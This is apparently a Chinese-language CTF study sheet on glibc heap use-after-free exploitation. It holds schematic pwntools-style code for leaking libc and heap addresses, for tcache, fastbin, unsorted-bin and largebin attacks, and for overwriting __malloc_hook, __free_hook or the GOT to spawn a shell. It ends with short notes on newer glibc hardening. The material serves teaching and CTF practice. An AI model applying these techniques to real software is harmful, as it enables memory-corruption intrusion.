# UAF (Use After Free)

## 原理

程序释放堆块后，仍持有指向该堆块的指针（悬垂指针），攻击者通过该指针读取/修改已释放的堆块，破坏堆元数据或泄露信息。

## 攻击链

### 1. 漏洞识别

```c
// 危险代码
char *ptr = malloc(0x20);
free(ptr);
// ptr 仍可用
ptr[0] = 'A';  // UAF 写
printf("%s", ptr);  // UAF 读
```

### 2. 基础 UAF

```python
from pwn import *

p = process('./pwn')

# 1. 分配
malloc(0x20)  # idx 0
# 2. 释放
free(0)
# 3. UAF 读（泄露）
fd = u64(read(0, 8))  # 读取 fd 指针
# 4. UAF 写（修改 fd）
edit(0, p64(target_addr))
# 5. 再次分配，返回 target_addr
malloc(0x20)  # idx 1
malloc(0x20)  # idx 2，返回 target_addr
```

### 3. UAF 泄露 libc

```python
# 1. 分配大 chunk（大于 tcache）
malloc(0x400)  # idx 0
malloc(0x20)   # idx 1，防止合并
# 2. 释放 idx 0，进入 unsorted bin
free(0)
# 3. UAF 读取 fd/bk（指向 main_arena）
fd = u64(read(0, 8))
libc_base = fd - (libc.symbols['main_arena'] + 96)
```

### 4. UAF 泄露堆地址

```python
# 1. 分配两个 chunk
malloc(0x20)  # idx 0
malloc(0x20)  # idx 1
# 2. 释放 idx 0，进入 tcache
free(0)
# 3. UAF 读取 fd（指向 NULL 或下一个 tcache 块）
# 如果 tcache 为空，fd = 0
# 如果有其他块，fd 指向堆地址

# 释放 idx 1
free(1)
# 现在 tcache: idx1 -> idx0
# UAF 读取 idx 1 的 fd
fd = u64(read(1, 8))
heap_base = fd & ~0xfff
```

### 5. UAF + Tcache Poisoning

```python
# glibc 2.26+
# 1. 分配
malloc(0x20)  # idx 0
# 2. 释放
free(0)
# 3. UAF 修改 fd
edit(0, p64(target_addr))
# 4. 分配两次
malloc(0x20)  # idx 1，返回原 idx 0
malloc(0x20)  # idx 2，返回 target_addr
```

### 6. UAF + Fastbin Attack

```python
# glibc < 2.26 或 tcache 满后
# 1. 分配 7 个 + 1 个
for i in range(7):
    malloc(0x70)  # idx 0-6
malloc(0x70)  # idx 7
malloc(0x20)  # idx 8，防止合并
# 2. 释放 7 个填满 tcache
for i in range(7):
    free(i)
# 3. 释放 idx 7，进入 fastbin
free(7)
# 4. UAF 修改 fd
edit(7, p64(target_addr))
# 5. 分配 7 个清空 tcache
for i in range(7):
    malloc(0x70)
# 6. 分配得到 target_addr
malloc(0x70)  # 返回 fastbin 中的块
malloc(0x70)  # 返回 target_addr
```

### 7. UAF + Unsorted Bin Attack

```python
# 1. 分配大 chunk
malloc(0x400)  # idx 0
malloc(0x20)   # idx 1
# 2. 释放 idx 0
free(0)
# 3. UAF 修改 bk
edit(0, p64(0) + p64(target_addr - 0x10))
# 4. 分配触发
malloc(0x400)
# target_addr 处被写入 main_arena 地址
```

### 8. UAF + Largebin Attack

```python
# 1. 分配大 chunk
malloc(0x420)  # idx 0
malloc(0x20)   # idx 1
malloc(0x410)  # idx 2
malloc(0x20)   # idx 3
# 2. 释放 idx 0
free(0)
# 3. 分配大 chunk，触发 idx 0 进入 largebin
malloc(0x430)  # idx 4
# 4. 释放 idx 2
free(2)
# 5. UAF 修改 idx 0 的 bk_nextsize
edit(0, ...)  # 修改 bk_nextsize = target_addr - 0x20
# 6. 分配触发
malloc(0x430)
# target_addr 处被写入堆地址
```

## 利用场景

### 1. 覆盖 __malloc_hook

```python
# glibc < 2.34
# 通过 UAF + tcache poisoning
malloc(0x20)  # idx 0
free(0)
edit(0, p64(malloc_hook))
malloc(0x20)  # idx 1
malloc(0x20)  # idx 2，返回 malloc_hook
edit(2, p64(one_gadget))
# 触发 malloc
p.sendline(b'1')
```

### 2. 覆盖 __free_hook

```python
# glibc < 2.34
malloc(0x20)  # idx 0
free(0)
edit(0, p64(free_hook))
malloc(0x20)  # idx 1
malloc(0x20)  # idx 2，返回 free_hook
edit(2, p64(system))
# 写入 /bin/sh
edit(0, b'/bin/sh\x00')
free(0)  # 触发 system("/bin/sh")
```

### 3. 覆盖 GOT 表

```python
# Partial RELRO
malloc(0x20)  # idx 0
free(0)
edit(0, p64(elf.got['free']))
malloc(0x20)  # idx 1
malloc(0x20)  # idx 2，返回 GOT 表
edit(2, p64(system))
edit(0, b'/bin/sh\x00')
free(0)
```

### 4. 覆盖栈上的返回地址

```python
# 1. 泄露栈地址（通过 _environ）
# 2. UAF + tcache poisoning 分配到栈上
# 3. 覆盖返回地址
```

### 5. House of Spirit

```python
# 在栈/BSS 上伪造 chunk
# 1. 在目标地址伪造 chunk 元数据
# 2. free 该地址
# 3. malloc 返回该地址
```

## 2024-2026 新技术点

### 1. glibc 2.34+ 无 hooks

```python
# 传统 __malloc_hook/__free_hook 失效
# 新利用方法：
# 1. IO_FILE 攻击（House of Apple 系列）
# 2. exit_funcs 利用
# 3. _environ 泄露栈地址
# 4. TLS 劫持
```

### 2. safe-linking

```python
# glibc 2.32+
# tcache/fastbin 指针加密
# UAF 修改 fd 时需要加密
heap_addr = ...
target = ...
encrypted = (heap_addr >> 12) ^ target
edit(idx, p64(encrypted))
```

### 3. tcache key 加固

```python
# glibc 2.29+ tcache key
# glibc 2.34+ 加强 key 检测
# UAF 修改 fd 时需要同时修改 key
edit(idx, p64(target) + p64(0))  # 覆盖 fd 和 key
```

### 4. House of Apple 系列

```python
# House of Apple 2/3
# 针对 glibc 2.34+
# 通过 UAF + IO_FILE 实现 RCE
# 利用 _IO_wfile_overflow 等
```

### 5. House of Cat

```python
# 2024 年新利用链
# 针对 glibc 2.35+
# 通过 UAF + IO_FILE 实现 RCE
```

### 6. 硬件级防护

```python
# Intel CET
# ARM PAC/BTI
# MTE (Memory Tagging Extension)
# 影响 UAF 利用
```

### 7. 沙箱环境

```python
# seccomp 限制
# 通过 ORW (open/read/write) 绕过
# 通过侧信道绕过
```

### 8. 新型利用链

```python
# House of Banana
# House of Emu
# 新的 IO_FILE 利用
```

## 工具推荐

- **pwntools** — Python 利用框架
- **gdb + pwndbg** — 动态调试
- **heap-viewer** — 堆可视化

## 参考链接

- [ctf-wiki UAF](https://ctf-wiki.org/pwn/linux/glibc-heap/use_after_free/)
- [how2heap](https://github.com/shellphish/how2heap)
- [UAF Exploitation](https://www.ayrx.me/use-after-free-exploitation)
